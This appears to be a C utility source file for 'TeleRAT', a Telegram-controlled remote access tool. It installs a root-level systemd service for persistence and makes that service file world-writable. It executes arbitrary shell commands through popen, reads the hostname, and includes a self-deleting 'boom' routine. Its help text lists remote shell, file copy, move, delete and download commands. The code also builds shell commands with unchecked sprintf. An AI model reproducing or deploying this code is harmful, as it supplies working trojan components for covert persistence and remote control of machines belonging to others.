#include "util.h"

//Check is this program run as root or not
void i_am_root(){
    if(getuid() != 0){
        printf("\nI'm not ROOOOOOT!.\n(Please Run with Sudo or ROOT)\n\n");
        exit(1);
    }
}

//get Program Name
void getpName(char *pName){
    unsigned int len = strlen(pName);
    //parse ./move -> /move
    if(pName[0] == '.'){
    strncpy(pName,pName+2,len-2);
    //add null byte for stop string
    pName[len-2] ='\0';
    }
}

//Get Now file location
void getNowPath(char *nowPath){

    if (getcwd(nowPath, 1024) == NULL)
       perror("getcwd() error");
}
void exeCMD(char *cmd){
    char exec_handle[5000];
    sprintf(exec_handle,"timeout 10 %s 1>result.txt 2>error.txt",cmd);
    FILE *fp = popen(exec_handle, "r");
    pclose(fp);
}

void initSetiing(char *pName,char *ip,char *port){
    struct cmd_struct cmd;
    char path[2000];
    getpName(pName);
    getNowPath(path);
	//Connect path with program	
	sprintf(cmd.cmd,"%s/%s",path,pName);
	
	//writing in /etc/systemd/system
	FILE *f = fopen("/etc/systemd/system/TeleRAT.service","wb");
	if(f == NULL)
	{
	   printf("Error can't open file");
	   exit(1);
	}
    char *text = malloc(sizeof(cmd.cmd));
	FILE *ch = popen("chmod a+wx /etc/systemd/system/TeleRAT.service","r");
    pclose(ch);
	sprintf(text,"[Unit]\n"
		"Description = TeleRAT Remote Administrator Via Telegram\n\n"
        "[Service]\n"
	    "ExecStart = %s %s %s\n\n"
		"[Install]\n"
	    "WantedBy=multi-user.target\n\n",cmd.cmd,ip,port);
    printf("%s",text);
    FILE *enable = popen("systemctl enable TeleRAT","r");
    pclose(enable);
	fprintf(f,"%s",text);
    free(text);
    fclose(f);
    bzero(cmd.cmd,sizeof(cmd.cmd));
}

//parse path to commandid move(char *path, char *pName){
//     struct cmd_struct cmd;
//      //Get now program location
//     getNowPath(cmd.nowPath);

//     printf("%s",cmd.nowPath);


//     //parse path to cmd
//     sprintf(cmd.cmd,"mv %s%s %s%s",cmd.nowPath,pName,path,pName);
//     // printf("%s",cmd.cmd);
//     exeCMD(cmd.cmd);
//     exeCMD("rm -rf /etc/systemd/system/TeleRAT.service");
//     bzero(cmd.cmd,sizeof(cmd.cmd));
//     initSetiing("/",pName);
// }


void boom(char *pName){
    struct cmd_struct cmd;
    getpName(pName);
    sprintf(cmd.cmd,"rm -rf %s",pName);
    FILE *fp;
    fp = popen("rm error.txt result.txt","r");
    pclose(fp);
    exeCMD(cmd.cmd);
    exit(1);
}

char *help(){
    return  "/help - List of commands\n"
            "/list - Show all avaliable clientst\n"
            "/select - Select the client by id\n"
            "/shell - Exec shell commands with timeout\n"
            "/cp - Copy file/folder\n"
            "/mv - Move file/folder\n"
            "/rm - Remove file/folder\n"
            "/mkdir - Make directory\n"
            "/getfile - Download file from bot\n"
            "/boom - DESTROY ITSELF!\n";
}


void getHostname(char *hostname){
    //Get hostname from this computer
    FILE *fp;
    fp = fopen("/etc/hostname","r");
    while (fgets(hostname, 1000, fp) != NULL)
    {
        // printf("%s", hostname);
    }
    for(int i=0;i<strlen(hostname);i++){
        if(hostname[i] == '\n'){
            hostname[i] = '\0';
        }
    }
    fclose(fp);
}

